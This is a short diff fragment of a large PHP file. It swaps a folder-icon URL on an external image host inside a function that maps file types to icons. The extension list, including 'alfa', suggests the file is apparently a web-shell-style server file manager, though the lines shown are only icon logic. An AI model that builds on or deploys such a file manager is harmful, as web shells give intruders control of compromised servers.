@@ -3229,7 +3229,7 @@ $a = 'https://i.ibb.co.com/';
 $s = 'http://solevisible.com/icons/';
 $types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
 if($type!='file'){
-return ($file=='..'?$s.'back.png':$a.'RGmD5kFn/Folder.webp');
+return ($file=='..'?$s.'back.png':$a.'nqsYd5fs/Download-Folder-3-D-folder-icon-3-D-folder-symbol-3-D-folder-image-for-free-removebg-preview.png');
 }else{
 $ext = explode('.',$file);
 $ext = end($ext);
